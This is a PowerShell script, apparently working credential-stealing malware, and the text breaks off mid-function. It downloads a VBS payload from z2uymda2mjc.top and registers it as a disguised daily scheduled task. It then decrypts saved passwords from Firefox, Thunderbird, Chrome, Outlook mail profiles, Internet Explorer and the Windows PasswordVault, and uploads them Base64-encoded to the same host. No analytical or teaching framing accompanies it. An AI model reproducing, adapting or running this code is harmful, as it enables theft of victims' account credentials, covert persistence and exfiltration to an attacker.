try{
  $zxeejzbb = $env:PUBLIC + "\Libraries"
  if (-not (Test-Path $zxeejzbb)) { md $zxeejzbb; }
  $aswivcbf = $zxeejzbb + "\WindowsIndexingService.vbs";
  $hiydyjtw = New-Object System.Net.WebClient;
  $hiydyjtw.Credentials = [System.Net.CredentialCache]::DefaultCredentials; 
  $hiydyjtw.DownloadString("http://z2uymda2mjc.top/?need=ma7dd05&") | out-file $aswivcbf;
  schtasks.exe /create /TN "WindowsApplicationService" /sc DAILY /st 00:00 /f /RI 1 /du 23:59 /TR $aswivcbf; 
}catch{}
function vyfbdwiutw( $atzzjdy ){
  $uuvtaygsv = New-Object System.Net.WebClient;
  $uuvtaygsv.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
  $uuvtaygsv.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
  $uuvtaygsv.Encoding = [System.Text.Encoding]::UTF8;
  try{
    $daaxcys = $uuvtaygsv.UploadString( "http://z2uymda2mjc.top/", "guid=temp_1856513450&" + $atzzjdy );
    return $daaxcys;
  }catch{};
  return $false;
};

function Get-ExecutableType{
  [CmdletBinding()]
  param (
      [Parameter(Mandatory = $true)]
      [ValidateScript({ Test-Path -LiteralPath $_ -PathType Leaf })]
      [string]
      $Path
  )
  try{
    try{
        $stream = New-Object System.IO.FileStream(
            $PSCmdlet.GetUnresolvedProviderPathFromPSPath($Path),
            [System.IO.FileMode]::Open,
            [System.IO.FileAccess]::Read,
            [System.IO.FileShare]::Read
        )
    }catch{
      vyfbdwiutw "crederror=ERR:Error opening file $Path for Read: $($_.Exception.Message)";
      throw
    }
    $exeType = 'Unknown'
    if ([System.IO.Path]::GetExtension($Path) -eq '.COM'){
      $exeType = '16-bit'
    }
    $bytes = New-Object byte[](4)
    if ( ($stream.Length -ge 64) -and  ($stream.Read($bytes, 0, 2) -eq 2) -and ($bytes[0] -eq 0x4D -and $bytes[1] -eq 0x5A) ){
        $exeType = 16

        if ( ($stream.Seek(0x3C, [System.IO.SeekOrigin]::Begin) -eq 0x3C) -and ($stream.Read($bytes, 0, 4) -eq 4) ){
            if (-not [System.BitConverter]::IsLittleEndian) { [Array]::Reverse($bytes, 0, 4) }
            $peHeaderOffset = [System.BitConverter]::ToUInt32($bytes, 0)

            if ($stream.Length -ge $peHeaderOffset + 6 -and
                $stream.Seek($peHeaderOffset, [System.IO.SeekOrigin]::Begin) -eq $peHeaderOffset -and
                $stream.Read($bytes, 0, 4) -eq 4 -and
                $bytes[0] -eq 0x50 -and $bytes[1] -eq 0x45 -and $bytes[2] -eq 0 -and $bytes[3] -eq 0)
            {
                $exeType = 'Unknown'

                if ($stream.Read($bytes, 0, 2) -eq 2)
                {
                    if (-not [System.BitConverter]::IsLittleEndian) { [Array]::Reverse($bytes, 0, 2) }
                    $machineType = [System.BitConverter]::ToUInt16($bytes, 0)

                    switch ($machineType)
                    {
                        0x014C { $exeType = 32 }
                        0x0200 { $exeType = 64 }
                        0x8664 { $exeType = 64 }
                    }
                }
            }
        }
    }
    return $exeType
  }catch{
      throw
  }finally{
      if ($null -ne $stream) { $stream.Dispose() }
  }
}


$stillerBlock = {

$ErrorActionPreference = "SilentlyContinue"
$global:log = [System.IO.Path]::GetTempFileName()

try{ Start-Transcript -Append $global:log; }catch{}

function mergeInfo($data, $info){
  try{
    foreach($record in $data.info.Keys) {
      if($info.info[$record.ToString()] -eq $null) {
          $info.info[$record] = @()
      }
      foreach($value in $data.info[$record]) {
          $info.info[$record] += @{ [string]$value.Keys = [string]$value.Values }
      }    
    }
  }catch{
    vyfbdwiutw "crederror=ERR:mergeInfo: $($_.Exception.Message)";
  }
}


Function ff_dump{
try{
    $ffInfo = @{}
    $ffError = "SUCCESS"


    $mPaths = @("$env:SystemDrive\Program Files\Mozilla Firefox", "$env:SystemDrive\Program Files\Mozilla Thunderbird", "$env:SystemDrive\Program Files (x86)\Mozilla Firefox", "$env:SystemDrive\Program Files (x86)\Mozilla Thunderbird")    
    $mozillaPath = $null


        foreach($path in $mPaths) {
			$nssPath = $(Join-Path ([string]$path) ([string]'nss3.dll'))

				if([System.IO.File]::Exists($nssPath)) {
					$mozillaPath = ([string]$path)
					break
				}
        }

        if($mozillaPath -eq $null) {
            return @{"logs" = "$global:log"; "error" = $ffError; "info" = $ffInfo}  
        }
    

        try
        {
           Add-Type -AssemblyName System.web.extensions 
        }
        catch
        {
            return @{"logs" = "$global:log"; "error" = "Load WEB assembly"; "info" = $ffInfo}    
        }



    $netStructs =  @"
	public struct TSECItem2 {
		public int SECItemType;
		public int SECItemData;
		public int SECItemLen;
	}

	public struct SlotInfo {
	}
"@  
 
 
    $cp = New-Object System.CodeDom.Compiler.CompilerParameters
    $cp.CompilerOptions = '/unsafe'
        
    Add-Type -TypeDefinition $netStructs -Language CSharp -CompilerParameters $cp 
  
    
    $netCode = @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Text;


		public static class nss3
		{
			[DllImport("nss3.dll", EntryPoint = "PL_Base64Decode", CallingConvention = CallingConvention.StdCall,  CharSet = CharSet.Auto)]
				public static extern IntPtr PL_Base64Decode(IntPtr inStr, int inLen, IntPtr outStr);
		
			[DllImport("nss3.dll", CharSet=CharSet.Auto)]	
				public static extern IntPtr PK11_GetInternalKeySlot();
	
			[DllImport("nss3.dll", CharSet=CharSet.Auto)]	
				public static extern void PK11_FreeSlot(IntPtr SlotInfoPtr);	
		
			[DllImport("nss3.dll", CharSet=CharSet.Auto)]		
				public static extern int PK11_CheckUserPassword(IntPtr slotInfo, string pwd);
		
		
			[DllImport("nss3.dll", EntryPoint = "PK11SDR_Decrypt", CallingConvention = CallingConvention.Cdecl,  CharSet = CharSet.Ansi)]
				public static extern int  PK11SDR_Decrypt(IntPtr dataIn, IntPtr dataOut, string pVoid);

			[DllImport("nss3.dll", EntryPoint = "SECITEM_ZfreeItem", CallingConvention = CallingConvention.Cdecl,  CharSet = CharSet.Ansi)]
				public static extern void  SECITEM_ZfreeItem(IntPtr secItem, int count);
				
			[DllImport("nss3.dll", EntryPoint = "NSSUTIL_GetVersion", CallingConvention = CallingConvention.StdCall,  CharSet = CharSet.Auto)]
				public static extern IntPtr NSSUTIL_GetVersion();

			[DllImport("nss3.dll", EntryPoint = "NSS_IsInitialized", CallingConvention = CallingConvention.StdCall,  CharSet = CharSet.Auto)]
				public static extern bool NSS_IsInitialized();
	
			[DllImport("nss3.dll", EntryPoint = "NSS_Init", CallingConvention = CallingConvention.StdCall,  CharSet = CharSet.Auto)]
				public static extern int NSS_Init(byte[] path);	
			
			[DllImport("nss3.dll", EntryPoint = "NSS_Shutdown", CallingConvention = CallingConvention.StdCall,  CharSet = CharSet.Auto)]
				public static extern int NSS_Shutdown();
		
		
			[DllImport("nss3.dll", CharSet=CharSet.Auto)]	
				public static extern int PORT_GetError();
		
			[DllImport("nss3.dll", CharSet=CharSet.Auto)]		
				public static extern IntPtr PR_ErrorToName(int err);
		}


		internal static class UnsafeNativeMethods
		{
			[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
				internal static extern IntPtr LoadLibrary(string lpFileName);
    
			[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
				internal static extern bool FreeLibrary(IntPtr hModule);
    
    

			[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
				internal static extern bool SetDllDirectoryW(string lpPathName);

			[DllImport("kernel32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
				internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
		}


		public static class Stiller
		{

			static IntPtr pk11slot = IntPtr.Zero;
	
			static IntPtr vcruntime140dll = IntPtr.Zero;
			static IntPtr msvcp140dll = IntPtr.Zero;
			static IntPtr mozgluedll = IntPtr.Zero;
	
			static IntPtr nss3dll = IntPtr.Zero;


			public static void loadHelpers(string ffPath)
			{
				Stiller.vcruntime140dll = UnsafeNativeMethods.LoadLibrary(ffPath + "\\vcruntime140.dll");
				Stiller.msvcp140dll = UnsafeNativeMethods.LoadLibrary(ffPath + "\\msvcp140.dll");
				Stiller.mozgluedll = UnsafeNativeMethods.LoadLibrary(ffPath + "\\mozglue.dll"); 
			}

			public static IntPtr loadNSS3(string ffPath)
			{
				IntPtr nss3 = UnsafeNativeMethods.LoadLibrary(ffPath + "\\nss3.dll"); 
		
					Stiller.nss3dll = nss3;
			
				return nss3;    
			}
  
  
			public static bool initFF(string ffPath, string profilePath)
			{
				bool result = false;
  
  
					loadHelpers(ffPath);
		
					if(loadNSS3(ffPath) != IntPtr.Zero)
					{
						IntPtr nV = nss3.NSSUTIL_GetVersion();
						int nssInitRez = nss3.NSS_Init(Encoding.ASCII.GetBytes(profilePath));
			
							if(nssInitRez == 0)
							{
									pk11slot = nss3.PK11_GetInternalKeySlot();
						
								int checkPwd = nss3.PK11_CheckUserPassword(pk11slot, "");

					
									if(checkPwd == 0)
									{
										result = true;
									}
							}		
					}
		
		
				return result;	
			}
	
			public static void shutdownFF()
			{
					nss3.PK11_FreeSlot(pk11slot);
		
				int rez = nss3.NSS_Shutdown();

					UnsafeNativeMethods.FreeLibrary(nss3dll); 
					UnsafeNativeMethods.FreeLibrary(Stiller.mozgluedll); 
					UnsafeNativeMethods.FreeLibrary(Stiller.msvcp140dll);
					UnsafeNativeMethods.FreeLibrary(Stiller.vcruntime140dll);
			}
  
			public struct TSECItemType {
				public int SECItemType;
				public IntPtr SECItemData;
				public int SECItemLen;
			}
  
			public struct SlotInfo {
				public long l;
			}  
  
			public static string decodeData(string profilePath, string dataEnc, byte[] unBase64)
			{

				string decoded = "";	
		
					try
					{
		
						bool nssIsInit = nss3.NSS_IsInitialized();
		
							if(!nssIsInit)
							{
		
								return "";
							}
		
		
						int TSECItemTypeSize = Marshal.SizeOf(typeof(TSECItemType));	
						TSECItemType dataIn = new TSECItemType();		
		
		
							dataIn.SECItemData = Marshal.AllocHGlobal(unBase64.Length);
							Marshal.Copy(unBase64, 0, dataIn.SECItemData, unBase64.Length);
			
							dataIn.SECItemLen= unBase64.Length;
							dataIn.SECItemType= 0;
		

						IntPtr dataOutPtr = Marshal.AllocHGlobal(TSECItemTypeSize);
						IntPtr dataInPtr = Marshal.AllocHGlobal(TSECItemTypeSize);
							
							Marshal.StructureToPtr(dataIn, dataInPtr, true);			
		
					int decryptRez = nss3.PK11SDR_Decrypt(dataInPtr, dataOutPtr, null);
		
						if(decryptRez != 0)
						{
				
							return "";
						}
		
					TSECItemType dataOut = (Stiller.TSECItemType)Marshal.PtrToStructure(dataOutPtr, typeof(TSECItemType));	//
	
						decoded = PtrToStringSized(dataOut.SECItemData, dataOut.SECItemLen);
			
						nss3.SECITEM_ZfreeItem(dataOutPtr, 0);
						Marshal.FreeHGlobal(dataInPtr);
				}
				catch
				{  
					return "";
				}  

	
				return decoded;
			}
 
			private static string PtrToStringUtf8(IntPtr ptr) {
					if (ptr == IntPtr.Zero)
						return "";
    
				int len = 0;
					while (System.Runtime.InteropServices.Marshal.ReadByte(ptr, len) != 0)
						len++;
        
					if (len == 0)
						return "";

				byte[] array = new byte[len];
        System.Runtime.InteropServices.Marshal.Copy(ptr, array, 0, len);
				return System.Text.Encoding.UTF8.GetString(array);
			} 

			private static string PtrToStringSized(IntPtr ptr, int len) {
					if (ptr == IntPtr.Zero)
						return "";  
					
					if (len == 0)
						return "";
        
				byte[] array = new byte[len];
        System.Runtime.InteropServices.Marshal.Copy(ptr, array, 0, len);
				return System.Text.Encoding.UTF8.GetString(array);
			} 
}


"@ 

        Add-Type -TypeDefinition $netCode -Language CSharp -CompilerParameters $cp2


    $profilePathFF = "$($env:APPDATA)\Mozilla\Firefox\Profiles\*.*"
    $profilePathTB = "$($env:APPDATA)\ThunderBird\Profiles\*.*"
    
    $defaultProfiles = @()
    
		try {
			$defaultProfiles += $(Get-ChildItem $profilePathFF -ErrorAction SilentlyContinue) | select -ExpandProperty FullName -ErrorAction SilentlyContinue
			$defaultProfiles += $(Get-ChildItem $profilePathTB -ErrorAction SilentlyContinue) | select -ExpandProperty FullName -ErrorAction SilentlyContinue
		}
		catch {}


        if($mozillaPath -ne $null) {

            $nss = $(Join-Path ([string]$mozillaPath) ([string]'nss3.dll'))
               
            If([System.IO.File]::Exists($nss)) {
            
            
            
                foreach($defaultProfile in $defaultProfiles) {          
                      if($defaultProfile -ne $null ) {
                    
                        $jsonPath = $(Join-Path ([string]$defaultProfile) ([string]"logins.json"))
                        if([System.IO.File]::Exists($jsonPath)) {
							$jsonFile = (Get-Content $jsonPath -ErrorAction SilentlyContinue)
        
								if(!($jsonFile)){
								}else { 
										$ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer
										$obj = $ser.DeserializeObject($jsonFile)
										$initFF = $([Stiller]::initFF($mozillapath, $defaultProfile));	
											if($initFF -eq $True) {    
												$logins = $obj['logins']
												$count = ($logins.Count) - 1
        

													for($i = 0; $i -le $count; $i++)
													{
														$formUrl = $logins.GetValue($i)['formSubmitURL']
            
															if($formUrl -eq $null) {
																$formUrl = $logins.GetValue($i)['hostname']
																	
																	if($formUrl -eq $null) {
																		$formUrl = "empty"
																	}
															}
                                                        
                            if(($formUrl.StartsWith("smtp","CurrentCultureIgnoreCase")) -Or ($formUrl.StartsWith("pop","CurrentCultureIgnoreCase")) -Or ($formUrl.StartsWith("imap","CurrentCultureIgnoreCase"))) {    
                              $url = ([System.Uri]$formUrl).Host
                            }else{
                              $url = ([System.Uri]$formUrl).Host
                              if($url.Length -eq 0) {
                                $url = "empty"
                              }
                            }    

														$encPwd = $logins.GetValue($i)['encryptedPassword']
														$encUser = $logins.GetValue($i)['encryptedUsername']
                

															if($encPwd.Length -gt 0 -and $encUser.Length -gt 0) {
																$pass = [Stiller]::decodeData($defaultProfile, $encPwd, [System.Convert]::FromBase64String($encPwd))
																$user = [Stiller]::decodeData($defaultProfile, $encUser, [System.Convert]::FromBase64String($encUser))
                        
																	if($ffInfo[$url] -eq $null) {
																		$ffInfo[$url] = @()
																	}

																$ffInfo[$url] += @{ [string]$user = [string]$pass }
															}
													}
													[Stiller]::shutdownFF()
											}
								}
						}else{ $ffError = "NO PROFILE";	}
					}
				}
			}else{ $ffError = "NO ff\TB";  }
		}
  return @{"logs" = "$global:log"; "error" = $ffError; "info" = $ffInfo}
}catch{
  vyfbdwiutw "crederror=ERR:ff_dump: $($_.Exception.Message)";
}
}


Function __ToInt($ByteArray){   
  try{ 
    If ($ByteArray.Length -eq 0) { Return 0 }
    [int32] $Int = 0;
    $x = 0;
    Do{
      $Int = [math]::Floor($Int * [math]::Pow(2, 0x8)) -bor ($ByteArray[$x++])
    }While ($x -lt $ByteArray.Length)
    Return $Int;
  }catch{
    vyfbdwiutw "crederror=ERR:__ToInt: $($_.Exception.Message)";
  }
}

Function ParseVarint($ByteArray, [ref]$VarintSize){
  try{ 
    [int32] $Val = 0;
    $x = 0;
    Do {
      $Byte = $ByteArray[$x++];
      $Val = [math]::Floor($Val * [math]::Pow(2, 0x7)) -bor ($Byte -band 0x7F);
    }While($x -lt 8 -and ($Byte -band 0x80))
    $VarintSize.Value = $x;
    Return $Val;
  }catch{
    vyfbdwiutw "crederror=ERR:ParseVarint: $($_.Exception.Message)";
  } 
}

[ref]$VarintSize = 0;

Function ParseSQLite($Page){
  try{
    If ($Page[0] -ne 0x0D) { Return }
    $NumCells = __ToInt $Page[0x3..0x4];
    $CellAddrStart = 0x8;
    $CellAddrStop = $CellAddrStart + ($NumCells * 2) - 1;
    For ($x = $CellAddrStart; $x -le $CellAddrStop; $x += 2){
        $CellAddr = __ToInt ($Page[$x .. ($x + 1)]);
        ParseCellSQLite($Page[$CellAddr .. $Page.Length]);
    }
  }catch{
    vyfbdwiutw "crederror=ERR:ParseSQLite: $($_.Exception.Message)";
  } 
}

Function ParseCellSQLite($Cell){   
  try{
    $Offset = 0
    $PayloadLength = ParseVarint ($Cell[$Offset .. ($Offset + 4)]) $VarintSize
    $Offset += $VarintSize.Value
    $RowID = ParseVarint ($Cell[$Offset .. ($Offset + 4)]) $VarintSize 
    $Offset += $VarintSize.Value 
    If (($Offset + $Payload.Length) -le $Cell.Length){
        ParsePayloadSQLite $Cell[$Offset .. ($Offset + $PayloadLength - 1)]
    }
  }catch{
    vyfbdwiutw "crederror=ERR:ParseCellSQLite: $($_.Exception.Message)";
  } 
}

Function ParsePayloadSQLite($Payload){
  try{
    If ($Payload.Length -eq 0) { Return }
    [ref]$VarintSize = 0;
    $HeaderLength = ParseVarint $Payload[0 .. 8] $VarintSize 
    $Offset = $VarintSize.Value;
    $FieldSeq = @()
    For ($y = $Offset; $y -lt $HeaderLength; $y++){
        $Serial = ParseVarint $Payload[$y .. ($y + 8)] $VarintSize
        $y += $VarintSize.Value - 1
        Switch ($Serial) {
          {$_ -lt 0xA} { $Len = $SerialMap[$Serial]; break }
          {$_ -gt 0xB} { 
              If ($Serial % 2 -eq 0) { $Len = (($Serial - 0xC) / 2) }
              Else { $Len = (($Serial - 0xD) / 2) }
          }
        }
        $FieldSeq += $Len;
    }
    $Offset = $HeaderLength;
    For ($f = 0; $f -lt $FieldSeq.Length; $f++){
      $Str = $Encoding.GetString($Payload[$Offset .. ($Offset + $FieldSeq[$f] - 1)])
      $isBlack = 0
      If ($f -eq 0) { $url = $Str }
      ElseIf ($f -eq 3) { $user = $Str }
      ElseIf ($f -eq 5) { $pwd = DecodePasswordChrome($Payload[$Offset .. ($Offset + $FieldSeq[$f] - 1)]) }
      
      $Offset += $FieldSeq[$f]
    }
    if(-Not($user -like '^\u0001*') -and -Not($user -like '^\u0000')) {
      If ($user.Length -gt 0 -or $pwd.Length -gt 0){ 
        $url = ([System.Uri]$url).Host
        if($global:chromeInfo[$url] -eq $null) {
          $global:chromeInfo[$url] = @()    
        }
        $global:chromeInfo[$url] += @{[string]$user = [string]$pwd}
      }
    }	
  }catch{
    vyfbdwiutw "crederror=ERR:ParsePayloadSQLite: $($_.Exception.Message)";
  } 
}

Function DecodePasswordChrome($Password){
  try{
    $P = $Encoding.GetBytes($Password)
    try{
      $Decrypt = [System.Security.Cryptography.ProtectedData]::Unprotect($Password,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
      Return [System.Text.Encoding]::Default.GetString($Decrypt);
    }
    Catch { Return "" }
  }catch{
    vyfbdwiutw "crederror=ERR:DecodePasswordChrome: $($_.Exception.Message)";
  }  
}

function chrome_dump(){
  try{
    $global:chromeInfo = @{};
    $global:chromeError = "SUCCESS"
    $dbFilePath = "$($Env:USERPROFILE)\AppData\Local\Google\Chrome\User Data\*\Login Data"
    $dbFiles = $(Get-ChildItem $dbFilePath).FullName;       
    if($dbFiles.Count -le 0 -and $dbFiles.Length -le 0) {	$global:chromeError = "NO PROFILES";  }  
    foreach($dbFile in $dbFiles) {
			if($dbFile -ne $null) {
				if(([System.IO.File]::Exists($dbFile))) {
          $Stream = New-Object IO.FileStream -ArgumentList "$dbFile", 'Open', 'Read', 'ReadWrite'
          Add-Type -AssemblyName System.Security
          $Encoding = [System.Text.Encoding]::GetEncoding(28591)
          $StreamReader = New-Object IO.StreamReader -ArgumentList $Stream, $Encoding
          $BinaryText = $StreamReader.ReadToEnd()
          $StreamReader.Close()
          $Stream.Close()
          $SerialMap = @{0=0; 1=1; 2=2; 3=3; 4=4; 5=5; 6=6; 7=8; 8=0; 9=0}
          If ((Compare-Object $BinaryText[0x0 .. 0x5] @('S', 'Q', 'L', 'i', 't', 'e')) -eq $null){
              $NumPages = __ToInt($BinaryText[0x1C .. 0x1F])
              $PageSize = __ToInt($BinaryText[0x10 .. 0x11])
              for($x = 0x2; $x -lt $NumPages; $x++){
                $PageStart = ($x * $PageSize);
                ParseSQLite $BinaryText[$PageStart .. ($PageStart + $PageSize - 1)]
              }
          }
				}
      }
    }
    return @{"logs" = "$global:log"; "error" = $global:chromeError; "info" = $global:chromeInfo}    
  }catch{
    vyfbdwiutw "crederror=ERR:chrome_dump: $($_.Exception.Message)";
  }
}


function ol_dump(){
  try{
    $wms = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\*\9375CFF0413111d3B88A00104B2A6676\*";
    $office = "HKCU:\Software\Microsoft\Office\1[56].0\Outlook\Profiles\*\9375CFF0413111d3B88A00104B2A6676\*";
    $allPaths = @();
    $olInfo = @{};
    $olError = "SUCCESS";
    $tmpWMS = (Get-ChildItem $wms -ErrorAction SilentlyContinue)
    $tmpOffice = (Get-ChildItem $office -ErrorAction SilentlyContinue)
    if($tmpWMS -ne $null){ $allPaths += $tmpWMS; }
    if($tmpOffice -ne $null){ $allPaths += $tmpOffice; }
    Add-Type -AssemblyName System.Security
    foreach($path in $allPaths) {
      $imapServer = ($path | Get-ItemProperty -ErrorAction SilentlyContinue | select -ErrorAction SilentlyContinue -ExpandProperty "IMAP Server");
      if($imapServer -ne $null) {
          $server = $imapServer
          try{ $server =  [System.Text.Encoding]::DEFAULT.GetString($imapServer) -replace "\u0000","" -replace "0x00",""; }catch {}
          $userBytes = ($path | Get-ItemProperty -ErrorAction SilentlyContinue | select -ErrorAction SilentlyContinue -ExpandProperty "IMAP User");
          $user = ""; 
          if($userBytes -ne $null) {
            $user = $userBytes;
            try{ $user = [System.Text.Encoding]::DEFAULT.GetString($userBytes)  -replace "\u0000","" -replace "\x00",""; }catch{}
          }
          $encPwd = ($path | Get-ItemProperty -ErrorAction SilentlyContinue | select -ErrorAction SilentlyContinue -ExpandProperty "IMAP Password");
          $pwd = "";
          try{
            $pwd = [System.Text.Encoding]::DEFAULT.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($encPwd[1..$encPwd.Length], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))  -replace "\u0000","" -replace "0x00",""
          }catch{}
          try {
            $port = [System.Text.Encoding]::DEFAULT.GetString(($path | Get-ItemProperty -ErrorAction SilentlyContinue | select -ErrorAction SilentlyContinue -ExpandProperty "IMAP Port")) -replace "0x00",""
            $server += ":" + $port
          }catch{}
          if($olInfo[$server] -eq $null) { $olInfo[$server] = @(); }
          $olInfo[$server] += @{ [string]$user = [string]$pwd  }
          $smtpServer = ($path | Get-ItemProperty -ErrorAction SilentlyContinue | select -ErrorAction SilentlyContinue -ExpandProperty "SMTP Server");
          if($smtpServer -ne $null) {
            $server = $smtpServer;
            try{ $server =  [System.Text.Encoding]::DEFAULT.GetString($smtpServer) -replace "\u0000","" -replace "0x00",""; }catch{}
            if($olInfo[$server] -eq $null) { $olInfo[$server] = @(); }
            $olInfo[$server] += @{ [string]$user = [string]$pwd  }
          }
      }
      $pop3Server = ($path | Get-ItemProperty -ErrorAction SilentlyContinue | select -ErrorAction SilentlyContinue -ExpandProperty "POP3 Server");
      if($pop3Server -ne $null) {
          $server = $pop3Server              
          try { $server =  [System.Text.Encoding]::DEFAULT.GetString($pop3Server) -replace "\u0000","" -replace "0x00",""; }catch {}
          $userBytes = ($path | Get-ItemProperty -ErrorAction SilentlyContinue | select -ErrorAction SilentlyContinue -ExpandProperty "POP3 User")
          $user = "";
          if($userBytes -ne $null) {
            $user = $userBytes
            try{ $user = [System.Text.Encoding]::DEFAULT.GetString($userBytes)  -replace "\u0000","" -replace "\x00","";}catch {}
          }
          $encPwd = ($path | Get-ItemProperty -ErrorAction SilentlyContinue | select -ErrorAction SilentlyContinue -ExpandProperty "POP3 Password")
          $pwd = "";
          try {
            $pwd = [System.Text.Encoding]::DEFAULT.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($encPwd[1..$encPwd.Length], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))  -replace "\u0000","" -replace "0x00",""
          }catch {}
          try {
            $port = [System.Text.Encoding]::DEFAULT.GetString(($path | Get-ItemProperty -ErrorAction SilentlyContinue | select -ErrorAction SilentlyContinue -ExpandProperty "POP3 Port")) -replace "0x00",""
            $server += ":" + $port
          }catch {}
          if($olInfo[$server] -eq $null){ $olInfo[$server] = @(); }
          $olInfo[$server] += @{ [string]$user = [string]$pwd  }
          $smtpServer = ($path | Get-ItemProperty -ErrorAction SilentlyContinue | select -ErrorAction SilentlyContinue -ExpandProperty "SMTP Server");
          if($smtpServer -ne $null) {
            $server = $smtpServer;
            try { $server =  [System.Text.Encoding]::DEFAULT.GetString($smtpServer) -replace "\u0000","" -replace "0x00","";}catch {}
            if($olInfo[$server] -eq $null){  $olInfo[$server] = @();  }
            $olInfo[$server] += @{ [string]$user = [string]$pwd  }
          }
      }
    }
    return @{"logs" = "$global:log"; "error" = $olError; "info" = $olInfo}    
  }catch{
    vyfbdwiutw "crederror=ERR:ol_dump: $($_.Exception.Message)";
  }
}


function ie_dump(){
  try{
    Add-Type -AssemblyName System.Security
    $ieInfo = @{};
    $ieError = "SUCCESS"
    $shell = New-Object -ComObject Shell.Application
    $hist = $shell.NameSpace(34)
    $folder = $hist.Self;
    if((@($hist.Items()).Count) -le 0) { $ieInfo = "NO HISTORY"; }
    $hist.Items() | foreach {
      if ($_.IsFolder) {
        $siteFolder = $_.GetFolder
        $siteFolder.Items() | foreach {
          $site = $_;
          if ($site.IsFolder) {
            $pageFolder  = $site.GetFolder;
            $pageFolder.Items() | foreach {
              $url = $($pageFolder.GetDetailsOf($_,0)) ;
              $enc = [system.Text.Encoding]::UTF8;
              $entropy= $enc.GetBytes($url);
              $url16 = [System.Text.Encoding]::GetEncoding("UTF-16").GetBytes($url + "`0");
              $sha1 = [System.Security.Cryptography.SHA1]::Create();
              $hash = $sha1.ComputeHash($url16);
              $hs = "" ; $cs = 0
              $urlHASH = $($hash | %{ $hs += $_.ToString("x2") ; $cs += $_ } 
              ($hs + ($cs % 256).ToString("x2")).ToUpper())
              $fromREG = $null; 
              $fromREG = $(Get-ItemProperty -PATH "HKCU:\Software\Microsoft\Internet Explorer\IntelliForms\Storage2" -Name $urlHASH -ErrorAction SilentlyContinue | Select-Object -ExpandProperty $urlHASH)    
              if($fromREG -ne $null) {                                    
                try{ $Decrypt = [System.Security.Cryptography.ProtectedData]::Unprotect($fromREG, $url16, [System.Security.Cryptography.DataProtectionScope]::LocalMachine); }catch { Continue }
                $dwSize = [bitconverter]::ToInt32($Decrypt[0..3], 0)
                $dwSecretInfoSize = [bitconverter]::ToInt32($Decrypt[4..7], 0)
                $dwSecretSize = [bitconverter]::ToInt32($Decrypt[8..11], 0)
                $dwTotalSecrets = [bitconverter]::ToInt32($Decrypt[20..23], 0) / 2
                if($fromREG.Length -ge ($dwSize + $dwSecretInfoSize +$dwSercertSize)){
                  $url = ([System.Uri]$url).Host    
                  if($ieInfo[$url] -eq $null) { $ieInfo[$url] = @(); }
                  $allCreds = ([System.Text.Encoding]::Default.GetString($Decrypt[($Decrypt.Length - $dwSecretSize)..($Decrypt.Length)]) -split "\x00\x00") -replace "\x00", "";
                  for($i = 0; $i -lt $dwTotalSecrets; $i++ ) {
                    $user = $allCreds[$i]
                    $pwd = $allCreds[$i + 1]
                    $ieInfo[$url] += @{ [string]$user = [string]$pwd };
                  }                                            
                }
              }
            }
          }
        }
      }
    }
      
    if(([int32]([string][System.Environment]::OSVersion.Version.Major + [string][System.Environment]::OSVersion.Version.Minor)) -ge 62) {
      [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];
      $vault = New-Object Windows.Security.Credentials.PasswordVault;
      $allCreds = $vault.RetrieveAll() | % { $_.RetrievePassword();$_ }
      foreach($cred in $allCreds) {
        $url = ([System.Uri]$cred.Resource).Host
        if($ieInfo[$url] -eq $null) { $ieInfo[$url] = @(); }
        $ieInfo[$url] += @{ [string]$cred.UserName = [string]$cred.Password }
      }
    }

  return @{"logs" = "$global:log"; "error" = $ieError; "info" = $ieInfo}    
  }catch{
    vyfbdwiutw "crederror=ERR:ie_dump: $($_.Exception.Message)";
  }
}

$ffInfo = ff_dump
$ieInfo = ie_dump
$olInfo = ol_dump
$chromeInfo = chrome_dump

$allInfo = @{"logs" = "$global:log"; "error" = "SUCCESS"; "info" = @{}}    

mergeInfo $olInfo $allInfo
mergeInfo $chromeInfo $allInfo
mergeInfo $ieInfo $allInfo
mergeInfo $ffInfo $allInfo

Add-Type -AssemblyName System.Web.Extensions;
$ps_js = new-object system.web.script.serialization.javascriptSerializer;

  try{
    $sendInfo = @{};
    $allInfo["info"].GetEnumerator() | %{
      $host1 = ([string]$_.key).toLower();
      if( $host1 -ne "empty" ){
        $sendInfo[ $host1 ] = @();
        foreach($value in $_.value ) {
          $sendInfo[ $host1 ] += @{ [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes( [string]($value.Keys) ) ) = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes( [string]($value.Values) ) ) };
        } 
      }
    }
    try{ vyfbdwiutw ("cred=" +  [uri]::EscapeDataString( $ps_js.Serialize($sendInfo) ) ); }catch{}
    try{ vyfbdwiutw ("crederror=" + $allInfo["error"]); }catch{}
  }catch{}
}

function dahgwaccd(){
  try{
    $mPaths = @("$env:SystemDrive\Program Files\Mozilla Firefox", "$env:SystemDrive\Program Files\Mozilla Thunderbird", "$env:SystemDrive\Program Files (x86)\Mozilla Firefox", "$env:SystemDrive\Program Files (x86)\Mozilla Thunderbird")    
    $mozillaPath = $null
    foreach($path in $mPaths) {
      $nssPath = $(Join-Path ([string]$path) ([string]'nss3.dll'))
      if([System.IO.File]::Exists($nssPath)) {
        $mozillaPath = $path;
        break;
      }
    }
    if($mozillaPath -eq $null) {
      $result = $stillerBlock.Invoke();
    }else{ 
      $dll = $(Join-Path ([string]$mozillaPath) ([string]'nss3.dll'))
      $is86dll = (Get-ExecutableType -Path $dll) -eq 32
      $is86 = [IntPtr]::Size -eq 4
      $result = $null;
